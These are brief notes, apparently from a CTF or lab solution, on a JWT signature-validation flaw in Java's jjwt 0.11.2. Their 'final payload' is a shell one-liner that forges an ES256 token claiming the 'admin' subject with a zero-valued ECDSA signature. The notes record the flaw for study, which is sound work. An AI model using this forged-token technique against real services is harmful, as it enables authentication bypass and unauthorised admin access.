+ java jwt vulnerability
+ used jjwt0.11.2 version
+ cve: https://github.com/jwtk/jjwt/issues/726S
+ final payload: echo "eyJhbGciOiJFUzI1NiJ9.`echo -n '{ "sub": "admin" }' | base64`.MAYCAQACAQA"
